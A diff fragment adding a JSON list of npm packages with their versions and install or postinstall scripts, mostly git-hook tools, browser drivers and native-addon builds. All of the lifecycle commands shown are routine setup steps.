+      }
+    },
+    {
+      "name": "@sitespeed.io/chromedriver",
+      "version": "153.0.8010",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "@sitespeed.io/edgedriver",
+      "version": "153.0.4234",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "@pact-foundation/pact-node",
+      "version": "10.18.0",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "pinchtab",
+      "version": "0.15.2",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@reddb-io/sdk",
+      "version": "1.23.4",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "ytdlp-nodejs",
+      "version": "3.4.5",
+      "scripts": {
+        "postinstall": "node -e \"process.env.INIT_CWD !== process.cwd() && require('child_process').execSync('npm run postdownload', { stdio: 'inherit' });\""
+      }
+    },
+    {
+      "name": "tree-sitter-cli",
+      "version": "0.27.0",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "lamdera",
+      "version": "0.19.1-1.4.0",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "@wundergraph/wunderctl",
+      "version": "0.180.0",
+      "scripts": {
+        "postinstall": "node dist/bin/install.js"
+      }
+    },
+    {
+      "name": "@qmahyar/cf-scanner",
+      "version": "0.14.0",
+      "scripts": {
+        "postinstall": "node install.js"
+      }
+    },
+    {
+      "name": "ngrok",
+      "version": "5.0.0-beta.2",
+      "scripts": {
+        "postinstall": "node ./postinstall.js"
+      }
+    },
+    {
+      "name": "@remem-ai/remem",
+      "version": "0.6.93",
+      "scripts": {
+        "postinstall": "node scripts/install.js"
+      }
+    },
+    {
+      "name": "hugo-bin",
+      "version": "0.163.0",
+      "scripts": {
+        "postinstall": "node lib/install.js"
+      }
+    },
+    {
+      "name": "edgedriver",
+      "version": "6.3.1",
+      "scripts": {
+        "install": "test -f ./dist/install.js && node ./dist/install.js || echo \"Skipping install, project not build!\""
+      }
+    },
+    {
+      "name": "puppeteer",
+      "version": "25.10.0",
+      "scripts": {
+        "postinstall": "node install.mjs"
+      }
+    },
+    {
+      "name": "ms-chromium-edge-driver",
+      "version": "0.5.1",
+      "scripts": {
+        "postinstall": "node lib/install.js"
+      }
+    },
+    {
+      "name": "appium",
+      "version": "3.7.0",
+      "scripts": {
+        "postinstall": "node ./scripts/autoinstall-extensions.js"
+      }
+    },
+    {
+      "name": "@testplane/edgedriver",
+      "version": "6.1.4",
+      "scripts": {
+        "install": "test -f ./dist/install.js && node ./dist/install.js || echo \"Skipping install, project not build!\""
+      }
+    },
+    {
+      "name": "wd",
+      "version": "1.14.0",
+      "scripts": {
+        "install": "node scripts/build-browser-scripts"
+      }
+    },
+    {
+      "name": "browser-webdriver-downloader",
+      "version": "3.0.7",
+      "scripts": {
+        "install": "node bin/install-msedgedriver"
+      }
+    },
+    {
+      "name": "rebrowser-puppeteer",
+      "version": "24.8.1",
+      "scripts": {
+        "postinstall": "node install.mjs"
+      }
+    },
+    {
+      "name": "webdriver-http-sync",
+      "version": "2.7.1",
+      "scripts": {
+        "install": "node-gyp rebuild"
+      }
+    },
+    {
+      "name": "@koloss777/nokk",
+      "version": "0.1.27-alpha",
+      "scripts": {
+        "postinstall": "node install.js"
+      }
+    },
+    {
+      "name": "@jackwener/opencli",
+      "version": "1.8.7",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js || true; node scripts/fetch-adapters.js || true"
+      }
+    },
+    {
+      "name": "stockfish",
+      "version": "18.0.8",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "chromium",
+      "version": "3.0.3",
+      "scripts": {
+        "postinstall": "node install.js"
+      }
+    },
+    {
+      "name": "browser-tabs-lock",
+      "version": "1.3.0",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "node-liblzma",
+      "version": "5.1.2",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "lefthook",
+      "version": "2.1.12",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "simple-git-hooks",
+      "version": "2.14.0",
+      "scripts": {
+        "postinstall": "node ./postinstall.js"
+      }
+    },
+    {
+      "name": "@evilmartians/lefthook",
+      "version": "2.1.12",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "bun-git-hooks",
+      "version": "0.3.3",
+      "scripts": {
+        "postinstall": "bun ./scripts/postinstall.ts"
+      }
+    },
+    {
+      "name": "git-hooks",
+      "version": "1.1.10",
+      "scripts": {
+        "postinstall": "./bin/git-hooks --install"
+      }
+    },
+    {
+      "name": "ghooks",
+      "version": "2.0.4",
+      "scripts": {
+        "install": "node ./bin/module-install"
+      }
+    },
+    {
+      "name": "git-hooks-plus",
+      "version": "1.0.1",
+      "scripts": {
+        "postinstall": "node ./bin/git-hooks --install"
+      }
+    },
+    {
+      "name": "shared-git-hooks",
+      "version": "1.2.1",
+      "scripts": {
+        "install": "node index.js"
+      }
+    },
+    {
+      "name": "@evilmartians/lefthook-installer",
+      "version": "2.1.12",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "git-scripts",
+      "version": "0.6.4",
+      "scripts": {
+        "postinstall": "node bin/install"
+      }
+    },
+    {
+      "name": "@saji/git-hooks",
+      "version": "1.2.3",
+      "scripts": {
+        "postinstall": "node -e \"if (process.env.ComSpec?.endsWith('\\cmd.exe')) { process.stderr.write('ERROR: To use @saji/git-hooks on Windows, install it and later use git inside a bash shell NOT cmd.exe.\\n'); process.exit (64) }\" && sh ./install.sh"
+      }
+    },
+    {
+      "name": "@cloud-ru/ft-config-husky",
+      "version": "1.3.1",
+      "scripts": {
+        "postinstall": "node scripts/prepare.js"
+      }
+    },
+    {
+      "name": "@chatie/git-scripts",
+      "version": "0.6.2",
+      "scripts": {
+        "postinstall": "node scripts/install.js"
+      }
+    },
+    {
+      "name": "pre-git",
+      "version": "3.17.1",
+      "scripts": {
+        "postinstall": "node src/install.js"
+      }
+    },
+    {
+      "name": "@jpp-toolkit/git-hooks",
+      "version": "0.0.69",
+      "scripts": {
+        "postinstall": "node scripts/install.js"
+      }
+    },
+    {
+      "name": "@jpapini/git-hooks",
+      "version": "1.5.10",
+      "scripts": {
+        "postinstall": "node scripts/install.js"
+      }
+    },
+    {
+      "name": "@loong64/lefthook",
+      "version": "2.1.10",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "lechnerio-git-hooks",
+      "version": "1.4.0",
+      "scripts": {
+        "postinstall": "node setup.mjs"
+      }
+    },
+    {
+      "name": "@nlib/githooks",
+      "version": "0.2.2",
+      "scripts": {
+        "postinstall": "node esm/cli.mjs enable"
+      }
+    },
+    {
+      "name": "@sammosna/git-hooks",
+      "version": "2.4.1",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "@vercel/git-hooks",
+      "version": "1.0.0",
+      "scripts": {
+        "install": "node ./install.js"
+      }
+    },
+    {
+      "name": "pumuki",
+      "version": "6.3.379",
+      "scripts": {
+        "postinstall": "node scripts/consumer-postinstall.cjs"
+      }
+    },
+    {
+      "name": "git-hooks-win",
+      "version": "1.1.11",
+      "scripts": {
+        "postinstall": "git-hooks --install"
+      }
+    },
+    {
+      "name": "hookem",
+      "version": "3.0.4",
+      "scripts": {
+        "install": "node cli install"
+      }
+    },
+    {
+      "name": "@evilmartians-loong64/lefthook",
+      "version": "2.1.9",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "js-git-hooks",
+      "version": "0.8.0",
+      "scripts": {
+        "postinstall": "bin/post-install.js"
+      }
+    },
+    {
+      "name": "@evilmartians-loong64/lefthook-installer",
+      "version": "2.1.9",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "captain-git-hook",
+      "version": "2.0.0",
+      "scripts": {
+        "postinstall": "node ./"
+      }
+    },
+    {
+      "name": "hylia-plugin-git-hooks",
+      "version": "0.1.14",
+      "scripts": {
+        "postinstall": "node ./attachments/postinstall.js"
+      }
+    },
+    {
+      "name": "@ohos-ports/arkweid-lefthook",
+      "version": "0.7.7-beta.0",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "@ohos-ports/evilmartians-lefthook",
+      "version": "2.0.11-beta.0",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "node-hooks",
+      "version": "0.0.15",
+      "scripts": {
+        "postinstall": "node ./bin/hooks install"
+      }
+    },
+    {
+      "name": "githooklib",
+      "version": "2.1.1",
+      "scripts": {
+        "postinstall": "node setup-hooks.js"
+      }
+    },
+    {
+      "name": "@codemastersolutions/commitzero",
+      "version": "0.0.55",
+      "scripts": {
+        "postinstall": "node ./scripts/postinstall-shim.js"
+      }
+    },
+    {
+      "name": "@tomgrv/devcontainer-features-githooks",
+      "version": "7.16.0",
+      "scripts": {
+        "install": "if [ \"$INIT_CWD\" = \"$PWD\" ]; then sh ./install.sh; fi",
+        "postinstall": "if [ \"$INIT_CWD\" = \"$PWD\" ]; then configure-feature -s . githooks; fi"
+      }
+    },
+    {
+      "name": "@moyuyc/husky",
+      "version": "2.0.0",
+      "scripts": {
+        "install": "node husky install"
+      }
+    },
+    {
+      "name": "set-git-hooks-dir",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "node index.js || true"
+      }
+    },
+    {
+      "name": "@devpack/qakit",
+      "version": "0.0.64",
+      "scripts": {
+        "postinstall": "node -e \"try{require('./lib/prepare')}catch(e){}\""
+      }
+    },
+    {
+      "name": "@chotot/husky",
+      "version": "4.4.1",
+      "scripts": {
+        "install": "node husky install"
+      }
+    },
+    {
+      "name": "@shaberman-forks/husky",
+      "version": "4.2.5-1",
+      "scripts": {
+        "install": "node husky install",
+        "postinstall": "opencollective-postinstall || exit 0"
+      }
+    },
+    {
+      "name": "closedinterval-git-hooks",
+      "version": "2.1.2",
+      "scripts": {
+        "postinstall": "node ./make-links"
+      }
+    },
+    {
+      "name": "npm-git-hooks",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "node src/install.js"
+      }
+    },
+    {
+      "name": "@britishcouncil/git-hooks",
+      "version": "1.2.0",
+      "scripts": {
+        "postinstall": "node scripts/install.js"
+      }
+    },
+    {
+      "name": "@zkochan/husky",
+      "version": "0.0.0",
+      "scripts": {
+        "install": "node ./bin/install.js"
+      }
+    },
+    {
+      "name": "husky-4",
+      "version": "4.3.8",
+      "scripts": {
+        "install": "node husky install",
+        "postinstall": "opencollective-postinstall || exit 0"
+      }
+    },
+    {
+      "name": "bytedance-i18n-ghooks",
+      "version": "1.0.6",
+      "scripts": {
+        "install": "node ./bin/module-install"
+      }
+    },
+    {
+      "name": "eslint-config-stefan",
+      "version": "1.2.8",
+      "scripts": {
+        "postinstall": "node installScript.js"
+      }
+    },
+    {
+      "name": "captainhook",
+      "version": "0.4.3",
+      "scripts": {
+        "postinstall": "bin/captainhook install"
+      }
+    },
+    {
+      "name": "git-hooks-node",
+      "version": "0.0.9",
+      "scripts": {
+        "install": "node ./bin/install.js"
+      }
+    },
+    {
+      "name": "byulhook",
+      "version": "0.1.8",
+      "scripts": {
+        "preinstall": "node dist/bin/setup.mjs"
+      }
+    },
+    {
+      "name": "glg-hook-installer",
+      "version": "0.0.10",
+      "scripts": {
+        "postinstall": "scripts/install-agent.sh"
+      }
+    },
+    {
+      "name": "git-hooks-util",
+      "version": "1.0.2",
+      "scripts": {
+        "postinstall": "node ./index.js postinstall"
+      }
+    },
+    {
+      "name": "musky",
+      "version": "1.3.1",
+      "scripts": {
+        "install": "node husky install"
+      }
+    },
+    {
+      "name": "hoks",
+      "version": "0.1.22",
+      "scripts": {
+        "postinstall": "hoks --init"
+      }
+    },
+    {
+      "name": "x7-code-line",
+      "version": "1.2.1",
+      "scripts": {
+        "postinstall": "node src/postinstall.js"
+      }
+    },
+    {
+      "name": "tui-vue-hooks",
+      "version": "0.1.1",
+      "scripts": {
+        "postinstall": "node index"
+      }
+    },
+    {
+      "name": "git-vcs",
+      "version": "1.4.4",
+      "scripts": {
+        "install": "node ./bin/install.js"
+      }
+    },
+    {
+      "name": "git-hooks-scripts",
+      "version": "0.2.2",
+      "scripts": {
+        "install": "node index install"
+      }
+    },
+    {
+      "name": "commit-sentry",
+      "version": "0.1.14",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@zairakai/js-dev-tools",
+      "version": "2.1.0",
+      "scripts": {
+        "postinstall": "bash ./scripts/setup-project.sh --silent || true"
+      }
+    },
+    {
+      "name": "projkit",
+      "version": "0.3.0",
+      "scripts": {
+        "postinstall": "node -e \"const fs=require('fs'),p=require('path');const h=p.join(__dirname,'hooks','prepare-commit-msg');fs.existsSync(h)&&fs.chmodSync(h,0o755);fs.existsSync('dist/cli.js')&&require('child_process').execSync('node dist/cli.js',{stdio:'inherit'})\""
+      }
+    },
+    {
+      "name": "kail",
+      "version": "0.1.1",
+      "scripts": {
+        "install": "node -e \"require('./lib/install-hooks').default()\""
+      }
+    },
+    {
+      "name": "husky-interactive",
+      "version": "0.1.2",
+      "scripts": {
+        "install": "node ./bin/install.js"
+      }
+    },
+    {
+      "name": "app-git-hooks",
+      "version": "1.0.0",
+      "scripts": {
+        "install": "node index.js"
+      }
+    },
+    {
+      "name": "@stacksjs/gitlint",
+      "version": "0.1.8",
+      "scripts": {
+        "postinstall": "bunx git-hooks && bun run scripts/postinstall.ts"
+      }
+    },
+    {
+      "name": "pre-commit",
+      "version": "2.0.0",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "@chuyik/husky",
+      "version": "4.3.9",
+      "scripts": {
+        "install": "node husky install",
+        "postinstall": "opencollective-postinstall || exit 0"
+      }
+    },
+    {
+      "name": "githops",
+      "version": "0.6.1",
+      "scripts": {
+        "postinstall": "node install.js"
+      }
+    },
+    {
+      "name": "sync-modules",
+      "version": "0.1.0",
+      "scripts": {
+        "install": "bin/install"
+      }
+    },
+    {
+      "name": "clay-javascript-sdk",
+      "version": "0.0.6",
+      "scripts": {
+        "postinstall": "node_modules/bower/bin/bower install"
+      }
+    },
+    {
+      "name": "@intentsolutionsio/overnight-dev",
+      "version": "1.0.5",
+      "scripts": {
+        "postinstall": "node -e \"console.log(\\\"\\\\n\u2192 This npm package is a tracking/proof artifact. Install the plugin via:\\\\n  ccpi install overnight-dev\\\\n  or /plugin install overnight-dev@claude-code-plugins-plus in Claude Code\\\\n\\\")\""
+      }
+    },
+    {
+      "name": "yorkie",
+      "version": "2.0.0",
+      "scripts": {
+        "install": "node bin/install.js"
+      }
+    },
+    {
+      "name": "@voiceflow/husky-config",
+      "version": "1.5.1",
+      "scripts": {
+        "postinstall": "cd $PROJECT_CWD && husky install"
+      }
+    },
+    {
+      "name": "@umijs/yorkie",
+      "version": "2.0.5",
+      "scripts": {
+        "postinstall": "node bin/install.js"
+      }
+    },
+    {
+      "name": "cs-devtest",
+      "version": "1.2.9",
+      "scripts": {
+        "postinstall": "node ./bin/index.js init"
+      }
+    },
+    {
+      "name": "@digitoimistodude/code-quality-checks",
+      "version": "2.3.0",
+      "scripts": {
+        "postinstall": "node bin/setup.js"
+      }
+    },
+    {
+      "name": "@nexhome/yorkie",
+      "version": "2.0.8",
+      "scripts": {
+        "install": "node bin/install.js"
+      }
+    },
+    {
+      "name": "husky-tslint-pre-commit",
+      "version": "1.0.3",
+      "scripts": {
+        "install": "node ./index.js"
+      }
+    },
+    {
+      "name": "@ankylos/template-husky",
+      "version": "2.0.0",
+      "scripts": {
+        "preinstall": "npx only-allow pnpm"
+      }
+    },
+    {
+      "name": "@bubkoo/husky-hooks",
+      "version": "2.0.1",
+      "scripts": {
+        "postinstall": "node scripts/install.js"
+      }
+    },
+    {
+      "name": "@weahead/husky-config",
+      "version": "0.6.1",
+      "scripts": {
+        "postinstall": "node scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@alexis-gss/husky-config",
+      "version": "1.1.0",
+      "scripts": {
+        "postinstall": "node ./src/setup.js"
+      }
+    },
+    {
+      "name": "@kunlunjs/fabric",
+      "version": "0.11.1",
+      "scripts": {
+        "postinstall": "node dist/pregenerator.js"
+      }
+    },
+    {
+      "name": "husky-image-guard",
+      "version": "1.1.0",
+      "scripts": {
+        "postinstall": "node dist/postinstall.js || true"
+      }
+    },
+    {
+      "name": "4good-nextjs-essentials",
+      "version": "1.0.6",
+      "scripts": {
+        "postinstall": "node bin/init.js"
+      }
+    },
+    {
+      "name": "husky-silent",
+      "version": "1.0.0",
+      "scripts": {
+        "install": "node ./bin/install.js"
+      }
+    },
+    {
+      "name": "meteor-husky",
+      "version": "0.14.6",
+      "scripts": {
+        "install": "meteor node ./bin/install.js"
+      }
+    },
+    {
+      "name": "@tomiaa/git-gz",
+      "version": "0.0.1-beta.12",
+      "scripts": {
+        "postinstall": "node ./scripts/install.js"
+      }
+    },
+    {
+      "name": "husky-dontbark",
+      "version": "1.0.0",
+      "scripts": {
+        "install": "node ./bin/install.js"
+      }
+    },
+    {
+      "name": "@20i/mrm-preset",
+      "version": "1.3.0",
+      "scripts": {
+        "postinstall": "husky install"
+      }
+    },
+    {
+      "name": "@anejs/yorkie",
+      "version": "2.0.1",
+      "scripts": {
+        "install": "node bin/install.js"
+      }
+    },
+    {
+      "name": "commitlint-with-husky",
+      "version": "2.1.4",
+      "scripts": {
+        "postinstall": "node ./bin/index.js"
+      }
+    },
+    {
+      "name": "trucknet-commit",
+      "version": "1.5.6",
+      "scripts": {
+        "postinstall": "node ./copy-default-files"
+      }
+    },
+    {
+      "name": "husky-keroro",
+      "version": "1.1.0",
+      "scripts": {
+        "postinstall": "node ./index.js"
+      }
+    },
+    {
+      "name": "@secretflow/husky-hooks",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "node scripts/install.js"
+      }
+    },
+    {
+      "name": "setup-husky-cli",
+      "version": "0.3.6",
+      "scripts": {
+        "postinstall": "echo 'Husky setup completed. Run npm, yarn, or pnpm run setup-husky to configure your project.'"
+      }
+    },
+    {
+      "name": "@simonfestl/husky-cli",
+      "version": "1.39.0",
+      "scripts": {
+        "postinstall": "chmod +x ./dist/index.js 2>/dev/null || true"
+      }
+    },
+    {
+      "name": "setup-husky-eslint-prettier-ncompas",
+      "version": "1.0.8",
+      "scripts": {
+        "postinstall": "npm run setup"
+      }
+    },
+    {
+      "name": "docco-husky",
+      "version": "0.3.3",
+      "scripts": {
+        "install": "scripts/install.sh"
+      }
+    },
+    {
+      "name": "husky-java",
+      "version": "4.3.6",
+      "scripts": {
+        "install": "node husky install"
+      }
+    },
+    {
+      "name": "vue-cli-plugin-pre-merge-commit",
+      "version": "1.0.4",
+      "scripts": {
+        "install": "node bin/install.js"
+      }
+    },
+    {
+      "name": "gitkar",
+      "version": "1.0.12",
+      "scripts": {
+        "postinstall": "node ./lib/install.js"
+      }
+    },
+    {
+      "name": "husky-hg",
+      "version": "0.15.4",
+      "scripts": {
+        "install": "node ./bin/install.js"
+      }
+    },
+    {
+      "name": "frontengineerplugin",
+      "version": "0.1.31",
+      "scripts": {
+        "preinstall": "npm install chalk@4 commander@9 inquirer@7 ora@4 -g ",
+        "postinstall": "node install.js  "
+      }
+    },
+    {
+      "name": "@suha.thalib/code-shield",
+      "version": "1.0.8",
+      "scripts": {
+        "postinstall": "node src/setup.js"
+      }
+    },
+    {
+      "name": "chores",
+      "version": "5.0.2",
+      "scripts": {
+        "install": "node src/guide.js"
+      }
+    },
+    {
+      "name": "cs-pack",
+      "version": "1.1.47",
+      "scripts": {
+        "postinstall": "node ./bin/index.js install"
+      }
+    },
+    {
+      "name": "@nkiwi/yorkie-pnpm",
+      "version": "1.0.1",
+      "scripts": {
+        "install": "node bin/install.js"
+      }
+    },
+    {
+      "name": "mt-resource-diff-patch",
+      "version": "1.3.3",
+      "scripts": {
+        "install": "node-gyp rebuild --verbose"
+      }
+    },
+    {
+      "name": "@homebound/date-fns-patch",
+      "version": "2.28.0-rc.8",
+      "scripts": {
+        "postinstall": "bash ./scripts/copy-patch-to-installer.sh"
+      }
+    },
+    {
+      "name": "@villuminati/pkg-fixer-upper",
+      "version": "0.0.2",
+      "scripts": {
+        "postinstall": "bun index.ts"
+      }
+    },
+    {
+      "name": "@apollo/protobufjs",
+      "version": "1.2.8",
+      "scripts": {
+        "postinstall": "node scripts/postinstall"
+      }
+    },
+    {
+      "name": "@microsoft/node-core-library",
+      "version": "4.0.1",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "@microsoft/ts-command-line",
+      "version": "5.0.1",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "voice-calls-baileys",
+      "version": "2.0.0",
+      "scripts": {
+        "postinstall": "node scripts/apply-baileys-patch.js"
+      }
+    },
+    {
+      "name": "@microsoft/package-deps-hash",
+      "version": "3.0.1",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "typeorm-fixtures-cli",
+      "version": "4.1.0",
+      "scripts": {
+        "postinstall": "(opencollective-postinstall || exit 0) && (husky install || exit 0)"
+      }
+    },
+    {
+      "name": "pnpm",
+      "version": "12.4.1",
+      "scripts": {
+        "preinstall": "node install.js",
+        "postinstall": "node install.js"
+      }
+    },
+    {
+      "name": "@pnpm/exe",
+      "version": "12.4.1",
+      "scripts": {
+        "preinstall": "node install.js",
+        "postinstall": "node install.js"
+      }
+    },
+    {
+      "name": "@jscad/cli",
+      "version": "2.3.8",
+      "scripts": {
+        "postinstall": "node -e \"console.log('\\u001b[35m\\u001b[1mLove JSCAD? You can now donate to our open collective:\\u001b[22m\\u001b[39m\\n > \\u001b[34mhttps://opencollective.com/openjscad/donate\\u001b[0m')\""
+      }
+    },
+    {
+      "name": "ospec",
+      "version": "4.2.1",
+      "scripts": {
+        "postinstall": "node ./scripts/rename-stable-binaries.js"
+      }
+    },
+    {
+      "name": "argon2",
+      "version": "0.45.1",
+      "scripts": {
+        "install": "cross-env ZERO_AR_DATE=1 node-gyp-build"
+      }
+    },
+    {
+      "name": "@abandonware/noble",
+      "version": "1.9.2-26",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "yo",
+      "version": "7.0.1",
+      "scripts": {
+        "postinstall": "yodoctor"
+      }
+    },
+    {
+      "name": "mediasoup",
+      "version": "3.26.0",
+      "scripts": {
+        "postinstall": "node npm-scripts.mjs postinstall"
+      }
+    },
+    {
+      "name": "wasm-pack",
+      "version": "0.15.0",
+      "scripts": {
+        "postinstall": "node ./install.js"
+      }
+    },
+    {
+      "name": "workerd",
+      "version": "1.20260914.1",
+      "scripts": {
+        "postinstall": "node install.js"
+      }
+    },
+    {
+      "name": "@atheory-ai/wasm-plugin-toolkit",
+      "version": "0.0.4",
+      "scripts": {
+        "postinstall": "node bin/install-javy.cjs"
+      }
+    },
+    {
+      "name": "@swc/core",
+      "version": "1.16.2",
+      "scripts": {
+        "postinstall": "node postinstall.js"
+      }
+    },
+    {
+      "name": "tree-sitter-rust",
+      "version": "0.24.0",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "storybook-addon-react-router-v6",
+      "version": "3.0.0",
+      "scripts": {
+        "postinstall": "sh scripts/announcement.sh || :"
+      }
+    },
+    {
+      "name": "ember-modal-dialog",
+      "version": "5.0.0",
+      "scripts": {
+        "preinstall": "npx only-allow pnpm"
+      }
+    },
+    {
+      "name": "@matrix-org/matrix-sdk-crypto-nodejs",
+      "version": "0.6.6",
+      "scripts": {
+        "postinstall": "node download-lib.js"
+      }
+    },
+    {
+      "name": "xxhash-addon",
+      "version": "2.1.0",
+      "scripts": {
+        "install": "node install.js"
+      }
+    },
+    {
+      "name": "whatshell",
+      "version": "0.1.2",
+      "scripts": {
+        "postinstall": "node npm/install.js"
+      }
+    },
+    {
+      "name": "neon-image",
+      "version": "0.0.32",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build=false || neon build --release",
+        "postinstall": "ls native; rm -rf native/index.js native.index.d.ts"
+      }
+    },
+    {
+      "name": "@iml/node-libzfs",
+      "version": "0.1.19",
+      "scripts": {
+        "install": "neon build"
+      }
+    },
+    {
+      "name": "fs_mod_parser_neon",
+      "version": "0.1.5",
+      "scripts": {
+        "install": "npm run cargo-build -- --release"
+      }
+    },
+    {
+      "name": "@sst-provider/neon",
+      "version": "0.13.0",
+      "scripts": {
+        "postinstall": "node ./scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "heroku-cli-neon-hello-world",
+      "version": "0.1.0",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "@balena/systemd",
+      "version": "0.5.11",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build=false || (npm run build:rust:release && cargo clean)"
+      }
+    },
+    {
+      "name": "@ironcorelabs/recrypt-node-binding",
+      "version": "0.11.1",
+      "scripts": {
+        "install": "node-pre-gyp install"
+      }
+    },
+    {
+      "name": "@iota/wallet",
+      "version": "2.0.3-rc.47",
+      "scripts": {
+        "install": "prebuild-install --runtime napi --tag-prefix='wallet-nodejs-binding-v' && tsc || npm run rebuild"
+      }
+    },
+    {
+      "name": "pulumi-neon",
+      "version": "0.1.8",
+      "scripts": {
+        "postinstall": "node ./scripts/postinstall.js"
+      }
+    },
+    {
+      "name": "@iota/sdk",
+      "version": "1.1.6",
+      "scripts": {
+        "install": "prebuild-install --runtime napi --tag-prefix=iota-sdk-nodejs-v && tsc || yarn run rebuild"
+      }
+    },
+    {
+      "name": "@stoprocent/noble",
+      "version": "2.8.0",
+      "scripts": {
+        "install": "node-gyp-build"
+      }
+    },
+    {
+      "name": "duckdb",
+      "version": "1.4.4",
+      "scripts": {
+        "install": "node-pre-gyp install --fallback-to-build"
+      }
+    },
+    {
+      "name": "jpegtran-bin",
+      "version": "7.0.0",
+      "scripts": {
+        "postinstall": "node lib/install.js"
+      }
+    },
+    {
+      "name": "hapi-ninja",
+      "version": "0.4.1",
+      "scripts": {
+        "postinstall": "bower install"
+      }
+    },
+    {
+      "name": "nhsm",
+      "version": "0.2.1",
+      "scripts": {
+        "postinstall": "bower install"
+      }
+    },
+    {
+      "name": "magickwand.js",
+      "version": "2.1.0",
+      "scripts": {
+        "install": "npx xpm install && npx xpm run npm-install"
+      }
+    },
+    {
+      "name": "@topalex/magickwand.js",
+      "version": "2.0.0-rc.5.2-rsvg-jxl",
+      "scripts": {
+        "install": "xpm install && xpm run npm-install"
+      }
+    },
+    {
+      "name": "antelope-search",
+      "version": "2.1.5",
+      "scripts": {
+        "install": "cp -rv ./bin/linux/*.so /usr/local/lib/ 2>/dev/null"
+      }
+    },
+    {
+      "name": "@nfckit/core-pcsc",
+      "version": "1.0.0",
+      "scripts": {
+        "postinstall": "node dist/scripts/install.js"
+      }
+    }
+  ]
+}
